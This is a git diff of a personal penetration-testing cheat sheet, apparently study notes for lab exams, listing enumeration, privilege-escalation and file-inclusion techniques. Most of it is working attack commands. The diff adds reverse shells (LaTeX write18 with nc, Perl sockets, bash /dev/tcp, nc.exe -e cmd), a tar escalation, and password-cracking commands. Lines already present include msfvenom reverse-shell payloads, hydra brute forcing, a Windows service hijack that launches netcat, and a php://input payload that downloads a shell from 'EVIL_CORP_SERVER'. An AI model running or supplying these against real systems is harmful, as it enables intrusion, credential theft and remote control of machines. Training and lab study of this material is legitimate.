@@ -15,7 +15,7 @@
   - tcp connect success or resets
   - Responses from cli connect attempts
   - Filtering
-	  - ``` ip-addr==192.192.192.192 ```
+	  - ``` ip-addr==192.168.110.2 ```
 - Encoding
   - Unicode A ```%u4141```
   - Unicode NOPs ```%u9090```
@@ -26,6 +26,7 @@
   - ```nmap --source-port 67 --spoof-mac Cisco --script safe -p80,443 -T3 Target_IP -vv```
   - ```nmap -sU -T3 Ip-target -v ``` (Can take forever)
   - ```--source-port 53/67``` (DNS or DHCP)
+  - ```--spoof-mac Cisco```
   - ```nmap --script safe Target -vv```
   - ```nmap --script vuln Target -vv -oA nmap-vuln```
   - ```nmap -sC -sV -T3 --script vuln -p- --source-port 53 --spoof-mac cisco 10.13.37.10 -oA vuln-nmap -vv```
@@ -48,6 +49,7 @@
 - Ports 139, 445 (SMB)
   - nmap enumerate if possible with scripts if nothing came up before. perhaps change scan speed to slower one
   - enum4linux
+          - ```enum4linux 10.10.10.10 -a```
   - smbclient 
           - ```smbclient \\\\ip\\share```
           - ```smbclient -L //10.10.10.10/```
@@ -72,16 +74,23 @@
 	  - 7.0	Windows Vista and WIndows Server 2008
 	  - 7.5	Windows 7 and Windows Server 2008 R2
 	  - 8.0	Windows 8 and Windows Server 2012
-  - ```nikto -host ip-target -evasion 8``` (Many others check -H)
+  
+  - ```nikto -host ip-target -evasion 8``` (Many others, check -H)
   - ```nikto -host 10.11.1.227 -evasion 7``` (Change URL case)
   - ```nikto -host http://10.10.10.10 -port 8080 -evasion 5```
   - ```nikto -id admin:admin:Realm_name -host http://10.10.10.10 -dbcheck -evasion 5```
+  
   - ```dirb http://Ip-target -r``` **Different wordlist perhaps**
         - Non-recursive to save time, then inspect further if necessary
   - ```dirb http://10.10.10.10:8080 -u admin:admin``` (Credentialed)
+  
   - ```gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.13.37.10```
+  
   - ```wfuzz -z file,/opt/seclists/Discovery/Web-Content/common.txt --hc 302,404 http://10.13.37.10/FUZZ```
+  - ```wfuzz -c -v --hc 400,404 -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists/rockyou.txt -d "user=FUZZ&pass=FUZZ" https://10.10.10.11:10000/session_login.cgi
+  
   - ```wpscan --url http://10.10.10.10/wordpress/```
+  
   - Try nmap ``` -–script=http-enum.nse``` (others available)
   	- ```nmap -T4 --script safe -p80,443 Target_IP -vv```
   - Check site in browser (http/https)
@@ -115,7 +124,11 @@
    
 <H2>Linux</H2>
 
-- Low priv 
+- Low priv
+
+  - Paths
+        - ```export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH```
+	- ```export PATH=".:$PATH"```
   - find writeable directories if /tmp or /dev/shm not available
 	  - ```find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;```
   - netcat 
@@ -135,19 +148,22 @@
 		  - ```stty size``` (returns current window size)
 		  - ```stty -rows 48 -columns 120``` (eg size)
 - Priv esc linux
+  - GTFO BINS
+        - ```tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/dash```
   - try ```sudo su``` or ```sudo -l```
 	- If ```find``` has sudo ```sudo find /home -exec sh -i \;```
 	- ```sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"``` (https://v3ded.github.io/ctf/zico2.html)
 	- if these don’t work try get kernel and distro info to look for exploits
 	  - ```uname -ar```
-		- ```cat /etc/issue```
-		- ```cat /etc/*-release```
-		- ```cat /etc/lsb-release```
-		- ```cat /etc/redhat-release```
+	  - ```cat /etc/issue```
+	  - ```cat /etc/*-release```
+	  - ```cat /etc/lsb-release```
+	  - ```cat /etc/redhat-release```
+	  
   - SUID
 	  - ```find / -perm -u=s -type f 2>/dev/null ```
 	  - ```find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null```
-          - ```nmap --interactive``` then ```!sh``` (Have yet to be lucky enough to find this, much older versions only)
+          - ```nmap --interactive``` then ```!sh``` (Have yet to be lucky enough to find this, much older versions only,  V. 4.53.)
   - Available programs/languages on host:
 	  - ```which Perl,python```
 	  - ```locate```
@@ -191,15 +207,18 @@
  - Priv esc
    - Still busy gathering info... Have this so far:
    - ```cacls C:\WINDOWS\system32\``` This displays permissions on folder & same for file eg: cacls test.txt
+   
    - icacls for newer Windows versions (I think Vista upwards)
    - ```ps> runas /user:administrator cmd.exe```
    - ```accesschk.exe -ucqv *```
+   
    - Hijacking
 	  - ```sc config upnphost binpath= "C:\inetpub\nc.exe -nv 10.10.14.20 5555 -e C:\WINDOWS\System32\cmd.exe"```
 	  - ```sc config upnphost obj= ".\LocalSystem" password= ""```
 	  - ```sc qc upnphost```
 	  - ```net start upnphost```
 	  - Check dependancies
+   
    - Some PowerShell
 	  - ```powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1```
 
@@ -211,13 +230,19 @@
 	- ```http://target?cli=%22bHMgLWxhIC92YXIvdG1wLw==%22```
   - ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > stickfish.zip```
   - ```msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f psh --arch x64 --platform windows -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o stick.ps1```
+  - ```nc.exe 10.10.14.3 4444 -e c:\\Windows\\System32\\cmd.exe```
 - Passwords
+  
+  - Hashcat
+        - ```hashcat -m 20 -a 0 -o cracked.txt found-hash /usr/share/wordlists/rockyou.txt --force```
+  
   - wfuzz
         -```wfuzz -c -v --hc 400,404 -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists/rockyou.txt -d "user=FUZZ&pass=FUZZ" https://10.10.10.120:10000/session_login.cgi```
+  
   - Hydra
-        - ```hydra -l admin -P /Passwords.txt Target_Ip rdp```
-	- ```hydra -l administrator -P /opt/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt 10.10.10.10 http-get-form "/downloader/index.php?A=loggedin:username=^USER^&password=^PASS^:Invalid user name or password" -VV```
-	- ```hydra -l root -P /usr/share/wordlists/rockyou.txt -s 10000 10.10.10.10 https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed. Please try again." -w10 -t10 -VV -c 5 -f```
+          - ```hydra -l admin -P /Passwords.txt Target_Ip rdp```
+	  - ```hydra -l administrator -P /opt/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt 10.10.10.10 http-get-form "/downloader/index.php?A=loggedin:username=^USER^&password=^PASS^:Invalid user name or password" -VV```
+	  - ```hydra -l root -P /usr/share/wordlists/rockyou.txt -s 10000 10.10.10.10 https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed. Please try again." -w10 -t10 -VV -c 5 -f```
   
 - Remote file inclusion (https://sushant747.gitbooks.io/total-oscp-guide/remote_file_inclusion.html)
   - Similar to local file inclusion while not hosted on the target
@@ -229,10 +254,13 @@
 	  - ```http://192.192.192.192/index.php?page=http://naughty.com/badfile.txt```
 		- Badfile.txt:
 		  - ```<?php echo shell_exec("whoami");?>```
+
 - LFI (https://highon.coffee/blog/lfi-cheat-sheet/)
+
 - Manipulate files
   - ```http://Target-site/cgi-bin/main.cgi?file=main.cgi```
   	- Show source of main.cgi
+
 - Directory traversal and Server side tricks
   - ```http://testsite.com/get.php?f=/var/www/html/get.php```
   - ```http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc```
@@ -240,22 +268,30 @@
 	- Note above errors for clues on file locations etc....
   - ```foo.php?file=../../../../../../../etc/passwd```
   - ``` ../../../../../../../xampp/apache/logs/access.log%00 ``` < use with backdoor
+  
   - PHP ```expect:``` #Not enabled by default, uses expect wrapper to execute commands
   	- ```http://127.0.0.1/fileincl/example1.php?page=expect://ls```
+  
   - PHP (POST request) ```php://input```
 	- ```http://192.168.183.128/fileincl/example1.php?page=php://input```
 	  - input can be:
 		- ```<? system('wget http://EVIL_CORP_SERVER/php-reverse-shell.php -O /var/www/shell.php');?>```
 		- In browser:
 		  - ```http://Target_IP/shell.php```
+  
   - PHP ```php://filter```
 	- ```http://Target_IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd```
 	- Must decode the output from base64
 	- ```/proc/self/environ``` (If you able to write there)
+
 - Manipulate ```User Agent``` in Burp
+
 - phpinfo()
   - https://highon.coffee/blog/lfi-cheat-sheet/#fimap--phpinfo-exploit
 	- Uses phpinfo() to write temporary files together with fimap
+- LATEX
+  - ```\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f}```
+  
 - WAF
   - wafw00f http://example.com
   
@@ -264,6 +300,12 @@
 	  - ```?file=secret.doc%00.pdf```	  
   - I prefer SimpleHTTPServer to see active transfers
 	  - ```python -m SimpleHTTPServer 443``` 
+
+- Other
+  - Reverse Shells
+	  - ```\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f}```
+	  - ```perl -e 'use Socket;$i="10.10.14.16";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
+	  - ```/bin/bash -i >& /dev/tcp/10.10.14.16/443 0>&1```
 
 **usefull links**
 - https://netsec.ws/?p=331 (msfvenom,shells,tips)
